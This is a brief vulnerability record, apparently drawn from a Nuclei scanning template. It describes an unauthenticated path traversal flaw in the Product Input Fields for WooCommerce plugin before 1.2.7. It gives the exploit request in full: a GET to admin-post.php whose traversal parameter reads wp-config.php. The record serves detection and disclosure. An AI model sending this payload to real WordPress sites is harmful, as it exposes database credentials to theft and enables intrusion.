# Vulnerability: Product Input Fields for WooCommerce < 1.2.7 - Unauthenticated File Download
**Classification:** CWE-22
**Source:** Nuclei Template (`wp-woocommerce-file-download.yaml`)

## Description
WordPress WooCommerce < 1.2.7 is susceptible to file download vulnerabilities. The lack of authorization checks in the handle_downloads() function hooked to admin_init() could allow unauthenticated users to download arbitrary files from the blog using a path traversal payload.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-admin/admin-post.php?alg_wc_pif_download_file=../../../../../wp-config.php
```

